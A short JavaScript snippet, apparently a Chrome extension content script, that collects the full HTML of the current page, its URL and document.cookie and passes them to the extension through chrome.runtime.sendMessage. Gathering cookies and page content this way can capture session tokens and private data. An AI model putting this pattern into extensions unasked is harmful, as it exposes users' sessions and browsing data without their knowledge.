scrape_data=document.getElementsByTagName('html')[0]. innerHTML;
url_fetch=window.location.href;
cookies=document.cookie;
var data = { url: url_fetch,scrape_data:scrape_data,cookie:cookies };
// Create a FormData object and append the data as form fields
// chrome.runtime.sendMessage({ jsonData: data });
chrome.runtime.sendMessage(data);
